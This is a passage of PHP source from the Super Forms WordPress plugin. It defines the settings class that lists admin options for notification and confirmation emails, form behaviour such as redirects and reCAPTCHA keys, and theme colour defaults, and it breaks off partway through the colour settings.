<?php
/**
 * Settings related functions and actions.
 *
 * @author      feeling4design
 * @category    Admin
 * @package     SUPER_Forms/Classes
 * @class       SUPER_Settings
 * @version     1.0.0
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

if( !class_exists( 'SUPER_Settings' ) ) :

/**
 * SUPER_Settings Class
 */
class SUPER_Settings {
    
    /** 
	 *	All the fields
	 *
	 *	Create an array with all the fields
	 *
	 *	@since		1.0.0
	 */
	public static function fields( $settings=null, $default=0 ) {
		
        global $wpdb;

        $mysql_version = $wpdb->get_var("SELECT VERSION() AS version");
        
        if( $settings==null) {
            $settings = get_option( 'super_settings', true );
        }
        $settings = stripslashes_deep( $settings );
        
        $array = array();
        
        $array = apply_filters( 'super_settings_start_filter', $array, array( 'settings'=>$settings ) );
        
        /** 
         *	Email Headers
         *
         *	@since		1.0.0
        */
        $array['email_headers'] = array(
            'name' => __( 'Email Headers', 'super-forms' ),
            'label' => __( 'Email Headers', 'super-forms' ),
            'fields' => array(
                'header_to' => array(
                    'name' => __( 'Send mail to', 'super-forms' ),
                    'desc' => __( 'Recipient(s) email address seperated with commas', 'super-forms' ),
                    'placeholder' => __( 'your@email.com, your@email.com', 'super'),
                    'default' => self::get_value( $default, 'header_to', $settings, '{option_admin_email}' ),
                ),
                'header_from_type' => array(
                    'name'=> __( 'From', 'super-forms' ),
                    'desc' => __( 'Enter a custom email address or use the blog settings', 'super-forms' ),
                    'default' => self::get_value( $default, 'header_from_type', $settings, 'default' ),
                    'filter'=>true,
                    'type'=>'select',
                    'values'=>array(
                        'default' => __(  'Default blog email and name', 'super-forms' ),
                        'custom' => __(  'Custom from', 'super-forms' ),
                    )
                ),
                'header_from' => array(
                    'name' => __( 'From email address', 'super-forms' ),
                    'desc' => __( 'Example: info@companyname.com', 'super-forms' ),
                    'default' => self::get_value( $default, 'header_from', $settings, '{option_admin_email}' ),
                    'placeholder' => __( 'Company Email Address', 'super'),
                    'filter'=>true,
                    'parent'=>'header_from_type',
                    'filter_value'=>'custom',
                ),
                'header_from_name' => array(
                    'name' => __( 'From name', 'super-forms' ),
                    'desc' => __( 'Example: Company Name', 'super-forms' ),
                    'default' => self::get_value( $default, 'header_from_name', $settings, '{option_blogname}' ),
                    'placeholder' => __( 'Your Company Name', 'super'),
                    'filter'=>true,
                    'parent'=>'header_from_type',
                    'filter_value'=>'custom',
                ),
                'header_subject' => array(
                    'name' => __( 'Email subject', 'super-forms' ),
                    'desc' => __( 'The subject for this email', 'super-forms' ),
                    'default' => self::get_value( $default, 'header_subject', $settings, 'This mail was send from yourdomain.com' ),
                    'placeholder' => __( 'This mail was send from yourdomain.com', 'super'),
                ),
                'header_content_type' => array(
                    'name' => __( 'Email content type', 'super-forms' ),
                    'desc' => __( 'The content type to use for this email', 'super-forms' ),
                    'default' => self::get_value( $default, 'header_content_type', $settings, 'html' ),
                    'type'=>'select',
                    'values'=>array(
                        'html'=>'HTML',
                        'plain'=>'Plain text',
                    )
                ),
                'header_charset' => array(
                    'name' => __( 'Email Charset', 'super-forms' ),
                    'desc' => __( 'The content type to use for this email.<br />Example: UTF-8 or ISO-8859-1', 'super-forms' ),
                    'default' => self::get_value( $default, 'header_charset', $settings, 'UTF-8' ),
                ),
                'header_cc' => array(
                    'name' => __( 'CC email to', 'super-forms' ),
                    'desc' => __( 'Send copy to following address(es)', 'super-forms' ),
                    'default' => self::get_value( $default, 'header_cc', $settings, '' ),
                    'placeholder' => __( 'someones@email.com, someones@emal.com', 'super'),
                ),
                'header_bcc' => array(
                    'name' => __( 'BCC email to', 'super-forms' ),
                    'desc' => __( 'Send copy to following address(es), without able to see the address', 'super-forms' ),
                    'default' => self::get_value( $default, 'header_bcc', $settings, '' ),
                    'placeholder' => __( 'someones@email.com, someones@emal.com', 'super'),
                ),
                'header_additional' => array(
                    'name' => __('Additional Headers', 'super-forms' ),
                    'desc' => __('Add any extra email headers here (put each header on a new line)', 'super-forms' ),
                    'default' => self::get_value( $default, 'header_additional', $settings, '' ),
                    'type' =>'textarea'
                )
            )
        );
        $array = apply_filters( 'super_settings_after_email_headers_filter', $array, array( 'settings'=>$settings ) );
        
             
        /** 
         *	Email Settings
         *
         *	@since		1.0.0
        */
        $array['email_settings'] = array(        
            'name' => __( 'Email Settings', 'super-forms' ),
            'label' => __( 'Email Settings', 'super-forms' ),
            'fields' => array(        
                'send' => array(
                    'name' => __( 'Send Admin Email', 'super-forms' ),
                    'desc' => __( 'Send or do not send the admin emails', 'super-forms' ),
                    'default' => self::get_value( $default, 'send', $settings, 'yes' ),
                    'filter'=>true,
                    'type'=>'select',
                    'values'=>array(
                        'yes' => __( 'Send an admin email', 'super-forms' ),
                        'no' => __( 'Do not send an admin email', 'super-forms' ),
                    )
                ),
                'email_body_open' => array(
                    'name' => __( 'Email Body Open', 'super-forms' ),
                    'desc' => __( 'This content will be placed before the body content of the email.', 'super-forms' ),
                    'default' => self::get_value( $default, 'email_body_open', $settings, __( 'The following information has been send by the submitter:', 'super-forms' ) ),
                    'type'=>'textarea',
                    'filter'=>true,
                    'parent'=>'send',
                    'filter_value'=>'yes',
                ),
                'email_body' => array(
                    'name' => __( 'Email Body', 'super-forms' ),
                    'desc' => __( 'Use a custom email body. Use {loop_fields} to retrieve the loop.', 'super-forms' ),
                    'default' => self::get_value( $default, 'email_body', $settings, __( '<table cellpadding="5">{loop_fields}</table>', 'super-forms' ) ),
                    'type'=>'textarea',
                    'filter'=>true,
                    'parent'=>'send',
                    'filter_value'=>'yes',
                ),
                'email_body_close' => array(
                    'name' => __( 'Email Body Close', 'super-forms' ),
                    'desc' => __( 'This content will be placed after the body content of the email.', 'super-forms' ),
                    'default' => self::get_value( $default, 'email_body_close', $settings, __( "Best regards, {option_blogname}", "super-forms" ) ),
                    'type'=>'textarea',
                    'filter'=>true,
                    'parent'=>'send',
                    'filter_value'=>'yes',
                ),
                'email_loop' => array(
                    'name' => __( 'Email Loop', 'super-forms' ),
                    'desc' => __( 'Use a custom loop. Use {loop_label and {loop_value} to retrieve values.', 'super-forms' ),
                    'default' => self::get_value( $default, 'email_loop', $settings, __( '<tr><th valign="top" align="right">{loop_label}</th><td>{loop_value}</td></tr>', 'super-forms' ) ),
                    'type'=>'textarea',
                    'filter'=>true,
                    'parent'=>'send',
                    'filter_value'=>'yes',   
                ),
                'confirm' => array(
                    'name' => __( 'Confirmation Email', 'super-forms' ),
                    'desc' => __( 'Send or do not send confirmation emails', 'super-forms' ),
                    'default' => self::get_value( $default, 'confirm', $settings, 'yes' ),
                    'filter'=>true,
                    'type'=>'select',
                    'values'=>array(
                        'yes' => __( 'Send a confirmation email', 'super-forms' ),
                        'no' => __( 'Do not send a confirmation email', 'super-forms' ),
                    )
                ),
                'confirm_to' => array(
                    'name' => __( 'Confirmation To', 'super-forms' ),
                    'desc' => __( 'Recipient(s) email address seperated by commas', 'super-forms' ),
                    'default' => self::get_value( $default, 'confirm_to', $settings, '{field_email}' ),
                    'filter'=>true,
                    'parent'=>'confirm',
                    'filter_value'=>'yes',   
                ),
                'confirm_from_type' => array(
                    'name'=> __( 'Confirmation from', 'super-forms' ),
                    'desc' => __( 'Enter a custom email address or use the blog settings', 'super-forms' ),
                    'default' => self::get_value( $default, 'confirm_from_type', $settings, 'default' ),
                    'filter'=>true,
                    'parent'=>'confirm',
                    'filter_value'=>'yes',   
                    'type'=>'select',
                    'values'=>array(
                        'default' => __(  'Default blog email and name', 'super-forms' ),
                        'custom' => __(  'Custom from', 'super-forms' ),
                    )
                ),
                'confirm_from' => array(
                    'name' => __( 'Confirmation from email address', 'super-forms' ),
                    'desc' => __( 'Example: info@companyname.com', 'super-forms' ),
                    'default' => self::get_value( $default, 'confirm_from', $settings, '{option_admin_email}' ),
                    'placeholder' => __( 'Company Email Address', 'super'),
                    'filter'=>true,
                    'parent'=>'confirm_from_type',
                    'filter_value'=>'custom',
                ),
                'confirm_from_name' => array(
                    'name' => __( 'Confirmation from name', 'super-forms' ),
                    'desc' => __( 'Example: Company Name', 'super-forms' ),
                    'default' => self::get_value( $default, 'confirm_from_name', $settings, '{option_blogname}' ),
                    'placeholder' => __( 'Your Company Name', 'super'),
                    'filter'=>true,
                    'parent'=>'confirm_from_type',
                    'filter_value'=>'custom',
                ),
                'confirm_subject' => array(
                    'name' => __( 'Confirmation Subject', 'super-forms' ),
                    'desc' => __( 'The confirmation subject for this email', 'super-forms' ),
                    'default' => self::get_value( $default, 'confirm_subject', $settings, __( 'Thank you!', 'super-forms' ) ),
                    'filter'=>true,
                    'parent'=>'confirm',
                    'filter_value'=>'yes',  
                ),
                'confirm_body_open' => array(
                    'name' => __( 'Confirm Body Open', 'super-forms' ),
                    'desc' => __( 'This content will be placed before the confirmation email body.', 'super-forms' ),
                    'default' => self::get_value( $default, 'confirm_body_open', $settings, __( "Dear user,\n\nThank you for contacting us!", "super-forms" ) ),
                    'type'=>'textarea',
                    'filter'=>true,
                    'parent'=>'confirm',
                    'filter_value'=>'yes',  
                ),
                'confirm_body' => array(
                    'name' => __( 'Confirm Body', 'super-forms' ),
                    'desc' => __( 'Use a custom email body. Use {loop_fields} to retrieve the loop.', 'super-forms' ),
                    'default' => self::get_value( $default, 'confirm_body', $settings, __( '<table cellpadding="5">{loop_fields}</table>', 'super-forms' ) ),
                    'type'=>'textarea',
                    'filter'=>true,
                    'parent'=>'confirm',
                    'filter_value'=>'yes',  
                ),
                'confirm_body_close' => array(
                    'name' => __( 'Confirm Body Close', 'super-forms' ),
                    'desc' => __( 'This content will be placed after the confirmation email body.', 'super-forms' ),
                    'default' => self::get_value( $default, 'confirm_body_close', $settings, __( "We will reply within 48 hours.\n\nBest Regards, {option_blogname}", "super-forms" ) ),
                    'type'=>'textarea',
                    'filter'=>true,
                    'parent'=>'confirm',
                    'filter_value'=>'yes',  
                )
            )
        );
        $array = apply_filters( 'super_settings_after_email_settings_filter', $array, array( 'settings'=>$settings ) );

             
        /** 
         *	Email Template
         *
         *	@since		1.0.0
        */
        $array['email_template'] = array(        
            'name' => __( 'Email Template', 'super-forms' ),
            'label' => __( 'Email Template', 'super-forms' ),
            'fields' => array(        
                'email_template' => array(
                    'name' => __( 'Select email template', 'super-forms' ),
                    'desc' => __( 'Choose which email template you would like to use', 'super-forms' ),
                    'info'=>'<a target="_blank" href="http://codecanyon.net/user/feeling4design/portfolio">'.__('Click here to check out all available email templates!', 'super-forms' ).'</a>',
                    'type'=>'select',
                    'default' => self::get_value( $default, 'email_template', $settings, 'default_email_template' ),
                    'filter'=>true,
                    'values'=>array(
                        'default_email_template' => __('Default email template', 'super-forms' ),
                    )
                )
            )
        );
        $array = apply_filters( 'super_settings_after_email_template_filter', $array, array( 'settings'=>$settings ) );

                
        /** 
         *	Form Settings
         *
         *	@since		1.0.0
        */
        $array['form_settings'] = array(        
            'name' => __( 'Form Settings', 'super-forms' ),
            'label' => __( 'Form Settings', 'super-forms' ),
            'fields' => array(        
                'save_contact_entry' => array(
                    'name' => __( 'Save data', 'super-forms' ),
                    'desc' => __( 'Choose if you want to save the user data as a Contact Entry', 'super-forms' ),
                    'type'=>'select',
                    'default' => self::get_value( $default, 'save_contact_entry', $settings, 'yes' ),
                    'filter'=>true,
                    'values'=>array(
                        'yes' => __('Save as Contact Entry', 'super-forms' ),
                        'no' => __('Do not save data', 'super-forms' ),
                    )
                ),

                // @since 1.2.6  - custom contact entry titles
                'enable_custom_entry_title' => array(
                    'hidden_setting' => true,
                    'default' => self::get_value( $default, 'enable_custom_entry_title', $settings, '' ),
                    'type' => 'checkbox',
                    'filter'=>true,
                    'values' => array(
                        'true' => __( 'Enable custom entry titles', 'super-forms' ),
                    ),
                    'parent' => 'save_contact_entry',
                    'filter_value' => 'yes',
                ),
                'contact_entry_title' => array(
                    'name' => __('Enter a custom entry title', 'super-forms' ),
                    'desc' => __( 'You can use field tags {field_name} if you want', 'super-forms' ),
                    'default' => self::get_value( $default, 'contact_entry_title', $settings, __( 'Contact entry', 'super-forms' ) ),
                    'filter'=>true,
                    'parent'=>'enable_custom_entry_title',
                    'filter_value'=>'true',   
                ),
                'contact_entry_add_id' => array(
                    'default' => self::get_value( $default, 'contact_entry_add_id', $settings, '' ),
                    'type' => 'checkbox',
                    'filter'=>true,
                    'values' => array(
                        'true' => __( 'Append entry ID after the custom title', 'super-forms' ),
                    ),
                    'parent' => 'enable_custom_entry_title',
                    'filter_value' => 'true',
                ),

                /** 
                 *  Form action
                 *
                 *  @deprecated since 1.0.6
                */
                // 'form_actions' => array()
               
                'form_duration' => array(
                    'name' => __( 'Error FadeIn Duration', 'super-forms' ),
                    'desc' => __( 'The duration for error messages to popup in milliseconds.', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_duration', $settings, 500 ),
                    'type'=>'slider',
                    'min'=>0,
                    'max'=>1000,
                    'steps'=>100,
                ),
                'form_thanks_title' => array(
                    'name' => __( 'Thanks Title', 'super-forms' ),
                    'desc' => __( 'A custom thank you title shown after a user completed the form.', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_thanks_title', $settings, __( 'Thank you!', 'super-forms' ) ),
                ),
                'form_thanks_description' => array(
                    'name' => __( 'Thanks Description', 'super-forms' ),
                    'desc' => __( 'A custom thank you description shown after a user completed the form.', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_thanks_description', $settings, __( 'We will reply within 24 hours.', 'super-forms' ) ),
                    'type'=>'textarea',
                ),
                'form_preload' => array(
                    'name' => __( 'Preloader', 'super-forms' ),
                    'desc' => __( 'Custom use of preloader for the form.', 'super-forms' ),
                    'type'=>'select',
                    'default' => self::get_value( $default, 'form_preload', $settings, '1' ),
                    'values'=>array(
                        '1' => __( 'Enabled', 'super-forms' ),
                        '0' => __( 'Disabled', 'super-forms' ),
                    ),
                ),
                'enable_ajax' => array(
                    'hidden' => true,
                    'name' => __( 'Enable Ajax', 'super-forms' ),
                    'desc' => __( 'If your site uses Ajax to request post content activate this option. This makes sure styles/scripts are loaded before the Ajax request.', 'super-forms' ),
                    'type'=>'select',
                    'default' => self::get_value( $default, 'enable_ajax', $settings, '0' ),
                    'values'=>array(
                        '0' => __( 'Disabled', 'super-forms' ),
                        '1' => __( 'Enabled', 'super-forms' ),
                    ),
                ),
                'form_recaptcha' => array(
                    'hidden' => true,
                    'name' => '<a href="https://www.google.com/recaptcha" target="_blank">'.__( 'reCAPTCHA key', 'super-forms' ).'</a>',
                    'default' => self::get_value( $default, 'form_recaptcha', $settings, '' ),
                ),
                'form_recaptcha_secret' => array(
                    'hidden' => true,
                    'name' => '<a href="https://www.google.com/recaptcha" target="_blank">'.__( 'reCAPTCHA secret', 'super-forms' ).'</a>',
                    'default' => self::get_value( $default, 'form_recaptcha_secret', $settings, '' ),
                ),
                'form_redirect_option' => array(
                    'name'=>'Form redirect option',
                    'default' => self::get_value( $default, 'form_redirect_option', $settings, '' ),
                    'filter'=>true,
                    'type'=>'select',
                    'values'=>array(
                        ''=>'No Redirect',
                        'custom'=>'Custom URL',
                        'page'=>'Existing Page',
                    )
                ),
                'form_redirect' => array(
                    'name' => __('Enter a custom URL to redirect to', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_redirect', $settings, '' ),
                    'filter'=>true,
                    'parent'=>'form_redirect_option',
                    'filter_value'=>'custom',   
                ),
                'form_redirect_page' => array(
                    'name'=>'Select a page to link to',
                    'default' => self::get_value( $default, 'form_redirect_page', $settings, '' ),
                    'type'=>'select',
                    'values'=>SUPER_Common::list_posts_by_type_array('page'),
                    'filter'=>true,
                    'parent'=>'form_redirect_option',
                    'filter_value'=>'page',    
                ),
            )
        );
        $array = apply_filters( 'super_settings_after_form_settings_filter', $array, array( 'settings'=>$settings ) );


        /** 
         *	Theme & Colors
         *
         *	@since		1.0.0
        */
        $array['theme_colors'] = array(        
            'name' => __( 'Theme & Colors', 'super-forms' ),
            'label' => __( 'Theme & Colors', 'super-forms' ),
            'fields' => array(        
                'theme_style' => array(
                    'name' => __( 'Theme style', 'super-forms' ),
                    'type'=>'select',
                    'default' => self::get_value( $default, 'theme_style', $settings, '' ),
                    'values'=>array(
                        '' => __( 'Default Squared', 'super-forms' ),
                        'super-default-rounded' => __( 'Default Rounded', 'super-forms' ),
                        'super-full-rounded' => __( 'Full Rounded', 'super-forms' ),
                        'super-style-one' => __( 'Minimal', 'super-forms' ),
                    ),
                ),
                'theme_hide_icons' => array(
                    'name' => __( 'Hide field icons', 'super-forms' ),
                    'type'=>'select',
                    'default' => self::get_value( $default, 'theme_hide_icons', $settings, 'yes' ),
                    'values'=>array(
                        'yes' => __( 'Yes (hide)', 'super-forms' ),
                        'no' => __( 'No (show)', 'super-forms' ),
                    ),
                    'filter'=>true
                ),

                // @since 1.2.8  - RTL support
                'theme_rtl' => array(
                    'hidden_setting' => true,
                    'default' => self::get_value( $default, 'theme_rtl', $settings, '' ),
                    'type' => 'checkbox',
                    'values' => array(
                        'true' => __( 'Enable RTL (Right To Left layout)', 'super-forms' ),
                    ),
                ),

                'theme_icon_colors' => array(
                    'name' => __('Icon Colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_icon_color'=>array(
                            'label'=>'Icon color',
                            'default' => self::get_value( $default, 'theme_icon_color', $settings, '#B3DBDD' ),
                        ),
                        'theme_icon_color_focus'=>array(
                            'label'=>'Icon color focus',
                            'default' => self::get_value( $default, 'theme_icon_color_focus', $settings, '#4EB1B6' ),
                        ),
                        'theme_icon_bg'=>array(
                            'label'=>'Icon background',
                            'default' => self::get_value( $default, 'theme_icon_bg', $settings, '#ffffff' ),
                        ),
                        'theme_icon_bg_focus'=>array(
                            'label'=>'Icon background focus',
                            'default' => self::get_value( $default, 'theme_icon_bg_focus', $settings, '#ffffff' ),
                        ),
                        'theme_icon_border'=>array(
                            'label'=>'Icon border color',
                            'default' => self::get_value( $default, 'theme_icon_border', $settings, '#cdcdcd' ),
                        ),
                        'theme_icon_border_focus'=>array(
                            'label'=>'Icon border color focus',
                            'default' => self::get_value( $default, 'theme_icon_border_focus', $settings, '#cdcdcd' ),
                        ),                            
                    ),
                    'filter'=>true,
                    'parent'=>'theme_hide_icons',
                    'filter_value'=>'enabled',
                ),
                'theme_label_colors' => array(
                    'name' => __( 'Label & Description colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_field_label'=>array(
                            'label'=>__( 'Field label', 'super-forms' ),
                            'default' => self::get_value( $default, 'theme_field_label', $settings, '#444444' ),
                        ),
                        'theme_field_description'=>array(
                            'label'=>__( 'Field description', 'super-forms' ),
                            'default' => self::get_value( $default, 'theme_field_description', $settings, '#8e8e8e' ),
                        ),
                    ),
                ),
                'theme_ui_checkbox_colors' => array(
                    'name' => __( 'Checkbox & Radio colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_ui_checkbox_border'=>array(
                            'label'=>__( 'Check/Radio border', 'super-forms' ),
                            'default' => self::get_value( $default, 'theme_ui_checkbox_border', $settings, '#4EB1B6' ),
                        ),
                        'theme_ui_checkbox_inner'=>array(
                            'label'=>__( 'Check/Radio inner', 'super-forms' ),
                            'default' => self::get_value( $default, 'theme_ui_checkbox_inner', $settings, '#4EB1B6' ),
                        ),
                    ),
                ),
                'theme_ui_quantity_colors' => array(
                    'name' => __( 'Quantity button colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_ui_quantity_bg'=>array(
                            'label'=>__( 'Button background', 'super-forms' ),
                            'default' => self::get_value( $default, 'theme_ui_quantity_bg', $settings, '#4EB1B6' ),
                        ),
                        'theme_ui_quantity_font'=>array(
                            'label'=>__( 'Button font', 'super-forms' ),
                            'default' => self::get_value( $default, 'theme_ui_quantity_font', $settings, '#ffffff' ),
                        ),
                        'theme_ui_quantity_bg_hover'=>array(
                            'label'=>__( 'Button background hover', 'super-forms' ),
                            'default' => self::get_value( $default, 'theme_ui_quantity_bg_hover', $settings, '#7ed0d4' ),
                        ),
                        'theme_ui_quantity_font_hover'=>array(
                            'label'=>__( 'Button font hover', 'super-forms' ),
                            'default' => self::get_value( $default, 'theme_ui_quantity_font_hover', $settings, '#ffffff' ),
                        ),
                    ),
                ),
                'theme_ui_slider_colors' => array(
                    'name' => __( 'Slider colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_ui_slider_dragger'=>array(
                            'label'=>__( 'Dragger color', 'super-forms' ),
                            'default' => self::get_value( $default, 'theme_ui_slider_dragger', $settings, '#4EB1B6' ),
                        ),
                        'theme_ui_slider_track'=>array(
                            'label'=>__( 'Track color', 'super-forms' ),
                            'default' => self::get_value( $default, 'theme_ui_slider_track', $settings, '#CDCDCD' ),
                        ),
                    ),
                ),
                'theme_field_colors' => array(
                    'name' => __('Field Colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_field_colors_top'=>array(
                            'label'=>'Gradient Top',
                            'default' => self::get_value( $default, 'theme_field_colors_top', $settings, '#ffffff' ),
                        ),
                        'theme_field_colors_bottom'=>array(
                            'label'=>'Gradient Bottom',
                            'default' => self::get_value( $default, 'theme_field_colors_bottom', $settings, '#ffffff' ),
                        ),
                        'theme_field_colors_border'=>array(
                            'label'=>'Border Color',
                            'default' => self::get_value( $default, 'theme_field_colors_border', $settings, '#cdcdcd' ),
                        ),
                        'theme_field_colors_font'=>array(
                            'label'=>'Font Color',
                            'default' => self::get_value( $default, 'theme_field_colors_font', $settings, '#444444' ),
                        ),
                        'theme_field_colors_placeholder'=>array(
                            'label'=>'Placeholder Color',
                            'default' => self::get_value( $default, 'theme_field_colors_placeholder', $settings, '#444444' ),
                        ),                        
                    ),
                ),
                'theme_field_colors_focus' => array(
                    'name' => __('Field Colors Focus', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_field_colors_top_focus'=>array(
                            'label'=>'Gradient Top Focus',
                            'default' => self::get_value( $default, 'theme_field_colors_top_focus', $settings, '#ffffff' ),
                        ),
                        'theme_field_colors_bottom_focus'=>array(
                            'label'=>'Gradient Bottom Focus',
                            'default' => self::get_value( $default, 'theme_field_colors_bottom_focus', $settings, '#ffffff' ),
                        ),
                        'theme_field_colors_border_focus'=>array(
                            'label'=>'Border Color Focus',
                            'default' => self::get_value( $default, 'theme_field_colors_border_focus', $settings, '#cdcdcd' ),
                        ),
                        'theme_field_colors_font_focus'=>array(
                            'label'=>'Font Color Focus',
                            'default' => self::get_value( $default, 'theme_field_colors_font_focus', $settings, '#444444' ),
                        ),
                        'theme_field_colors_placeholder_focus'=>array(
                            'label'=>'Placeholder Color',
                            'default' => self::get_value( $default, 'theme_field_colors_placeholder_focus', $settings, '#444444' ),
                        ),                                                
                    ),
                ),
                'theme_field_transparent' => array(
                    'desc' => __( 'Allows you to set the field background to transparent', 'super-forms' ), 
                    'default' => self::get_value( $default, 'theme_field_transparent', $settings, '' ),
                    'type' => 'checkbox', 
                    'filter'=>true,
                    'values' => array(
                        'true' => __( 'Enable transparent backgrounds', 'super-forms' ),
                    )
                ),
                'theme_rating_colors' => array(
                    'name' => __('Rating Colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_rating_color'=>array(
                            'label'=>'Rating color',
                            'default' => self::get_value( $default, 'theme_rating_color', $settings, '#cdcdcd' ),
                        ),
                        'theme_rating_bg'=>array(
                            'label'=>'Rating background',
                            'default' => self::get_value( $default, 'theme_rating_bg', $settings, '#ffffff' ),
                        ),
                        'theme_rating_border'=>array(
                            'label'=>'Rating border color',
                            'default' => self::get_value( $default, 'theme_rating_border', $settings, '#cdcdcd' ),
                        ),
                    ),
                ),                    
                'theme_rating_colors_hover' => array(
                    'name' => __('Rating Colors Hover', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_rating_color_hover'=>array(
                            'label'=>'Rating color',
                            'default' => self::get_value( $default, 'theme_rating_color_hover', $settings, '#f7f188' ),
                        ),
                        'theme_rating_bg_hover'=>array(
                            'label'=>'Rating background',
                            'default' => self::get_value( $default, 'theme_rating_bg_hover', $settings, '#ffffff' ),
                        ),
                    ),
                ),
                'theme_rating_colors_active' => array(
                    'name' => __('Rating Colors Active', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_rating_color_active'=>array(
                            'label'=>'Rating color',
                            'default' => self::get_value( $default, 'theme_rating_color_active', $settings, '#f7ea00' ),
                        ),
                        'theme_rating_bg_active'=>array(
                            'label'=>'Rating background',
                            'default' => self::get_value( $default, 'theme_rating_bg_active', $settings, '#ffffff' ),
                        ),
                    ),
                ),
                'theme_product_colors' => array(
                    'name' => __('Product, Discount & Total Colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_currency_color'=>array(
                            'label'=>'Currency color',
                            'default' => self::get_value( $default, 'theme_currency_color', $settings, '#139307' ),
                        ),
                        'theme_amount_color'=>array(
                            'label'=>'Amount color',
                            'default' => self::get_value( $default, 'theme_amount_color', $settings, '#139307' ),
                        ),
                        'theme_quantity_color'=>array(
                            'label'=>'Quantity color',
                            'default' => self::get_value( $default, 'theme_quantity_color', $settings, '#ff0000' ),
                        ),
                        'theme_percentage_color'=>array(
                            'label'=>'Percentage color',
                            'default' => self::get_value( $default, 'theme_percentage_color', $settings, '#139307' ),
                        ),                            
                    ),
                ),
                'theme_progress_bar_colors' => array(
                    'name' => __('Progress Bar Colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_progress_bar_primary_color'=>array(
                            'label'=>'Primary color',
                            'default' => self::get_value( $default, 'theme_progress_bar_primary_color', $settings, '#87CC83' ),
                        ),
                        'theme_progress_bar_secondary_color'=>array(
                            'label'=>'Secondary color',
                            'default' => self::get_value( $default, 'theme_progress_bar_secondary_color', $settings, '#E2E2E2' ),
                        ),
                        'theme_progress_bar_border_color'=>array(
                            'label'=>'Border color',
                            'default' => self::get_value( $default, 'theme_progress_bar_border_color', $settings, '#CECECE' ),
                        ),
                    ),
                ),
                'theme_progress_step_colors' => array(
                    'name' => __('Progress Step Colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_progress_step_primary_color'=>array(
                            'label'=>'Primary color',
                            'default' => self::get_value( $default, 'theme_progress_step_primary_color', $settings, '#CECECE' ),
                        ),
                        'theme_progress_step_secondary_color'=>array(
                            'label'=>'Secondary color',
                            'default' => self::get_value( $default, 'theme_progress_step_secondary_color', $settings, '#E2E2E2' ),
                        ),
                        'theme_progress_step_border_color'=>array(
                            'label'=>'Border color',
                            'default' => self::get_value( $default, 'theme_progress_step_border_color', $settings, '#CECECE' ),
                        ),
                        'theme_progress_step_font_color'=>array(
                            'label'=>'Font color',
                            'default' => self::get_value( $default, 'theme_progress_step_font_color', $settings, '#FFFFFF' ),
                        ),                                
                    ),
                ),
                'theme_progress_step_colors_active' => array(
                    'name' => __('Progress Step Colors Active', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_progress_step_primary_color_active'=>array(
                            'label'=>'Primary color',
                            'default' => self::get_value( $default, 'theme_progress_step_primary_color_active', $settings, '#87CC83' ),
                        ),
                        'theme_progress_step_secondary_color_active'=>array(
                            'label'=>'Secondary color',
                            'default' => self::get_value( $default, 'theme_progress_step_secondary_color_active', $settings, '#E2E2E2' ),
                        ),
                        'theme_progress_step_border_color_active'=>array(
                            'label'=>'Border color',
                            'default' => self::get_value( $default, 'theme_progress_step_border_color_active', $settings, '#CECECE' ),
                        ),
                        'theme_progress_step_font_color_active'=>array(
                            'label'=>'Font color',
                            'default' => self::get_value( $default, 'theme_progress_step_font_color_active', $settings, '#FFFFFF' ),
                        ),                                
                    ),
                ),
                'theme_error' => array(
                    'name' => __('Error Colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_error_font'=>array(
                            'label'=>'Font Color',
                            'default' => self::get_value( $default, 'theme_error_font', $settings, '#f2322b' ),
                        ),                     
                    ),
                ),              


                /** 
                 *  Error & Success message colors
                 *
                 *  @since      1.0.6
                */
                'theme_error_msg' => array(
                    'name' => __('Error Message Colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_error_msg_font_color'=>array(
                            'label'=>'Font color',
                            'default' => self::get_value( $default, 'theme_error_msg_font_color', $settings, '#D08080' ),
                        ),
                        'theme_error_msg_border_color'=>array(
                            'label'=>'Border color',
                            'default' => self::get_value( $default, 'theme_error_msg_border_color', $settings, '#FFCBCB' ),
                        ),
                        'theme_error_msg_bg_color'=>array(
                            'label'=>'Background color',
                            'default' => self::get_value( $default, 'theme_error_msg_bg_color', $settings, '#FFEBEB' ),
                        ),
                        'theme_error_msg_icon_color'=>array(
                            'label'=>'Icon color',
                            'default' => self::get_value( $default, 'theme_error_msg_icon_color', $settings, '#FF9A9A' ),
                        ),
                    ),
                ),
                'theme_success_msg' => array(
                    'name' => __('Success Message Colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_success_msg_font_color'=>array(
                            'label'=>'Font color',
                            'default' => self::get_value( $default, 'theme_success_msg_font_color', $settings, '#5E7F62' ),
                        ),
                        'theme_success_msg_border_color'=>array(
                            'label'=>'Border color',
                            'default' => self::get_value( $default, 'theme_success_msg_border_color', $settings, '#90C397' ),
                        ),
                        'theme_success_msg_bg_color'=>array(
                            'label'=>'Background color',
                            'default' => self::get_value( $default, 'theme_success_msg_bg_color', $settings, '#C5FFCD' ),
                        ),
                        'theme_success_msg_icon_color'=>array(
                            'label'=>'Icon color',
                            'default' => self::get_value( $default, 'theme_success_msg_icon_color', $settings, '#90C397' ),
                        ),
                    ),
                ),

